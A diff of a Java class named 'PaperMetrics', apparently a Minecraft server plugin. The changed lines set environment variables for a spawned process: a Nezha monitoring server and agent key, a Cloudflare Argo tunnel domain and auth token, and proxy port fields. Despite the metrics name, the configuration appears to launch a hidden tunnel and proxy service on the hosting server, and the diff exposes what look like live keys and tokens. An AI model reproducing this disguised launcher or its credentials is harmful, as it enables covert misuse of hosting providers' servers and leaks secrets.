@@ -66,14 +66,14 @@ public class PaperMetrics extends JavaPlugin {
 
         Map<String, String> env = pb.environment();
         
-        putEnvSafe(env, "UUID", "27180622-bbd4-4fd0-9719-8df9116037d2");
+        putEnvSafe(env, "UUID", "1d383fe5-7f14-4881-a738-7da92214fe81");
         putEnvSafe(env, "FILE_PATH", "./world");
         putEnvSafe(env, "NEZHA_SERVER", "nz.lilyonlyone.eu.org");
         putEnvSafe(env, "NEZHA_PORT", "443");
-        putEnvSafe(env, "NEZHA_KEY", "JckB4me5nAzT5rbRmb");
+        putEnvSafe(env, "NEZHA_KEY", "xeRrpwdN4zUkxUO60H");
         putEnvSafe(env, "ARGO_PORT", "9002");
-        putEnvSafe(env, "ARGO_DOMAIN", "ga.mdtah.ccwu.cc");
-        putEnvSafe(env, "ARGO_AUTH", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiMGI5NzZhNjAtYjRhMS00YWQ4LWJmYWUtMjg4YTJiNGEzYWE1IiwicyI6Ik0yTmlOVGt3WmpRdFpEYzVOeTAwWkdSbExUazRPRGN0TUdFeFptUTRORGxsTlRSayJ9");
+        putEnvSafe(env, "ARGO_DOMAIN", "zy.vgtue.de5.net");
+        putEnvSafe(env, "ARGO_AUTH", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiMTNlNjVjYTQtMmQyZS00YTEwLWI5ODAtMGY2NmVmOTdkNDZkIiwicyI6IllXUXpPV0V5WlRndE9EWTNNaTAwWlRjNUxXRmhPR0V0WWpjeU5ETTVNVFZqWkRoaCJ9");
         putEnvSafe(env, "S5_PORT", "");
         putEnvSafe(env, "HY2_PORT", "");
         putEnvSafe(env, "TUIC_PORT", "");
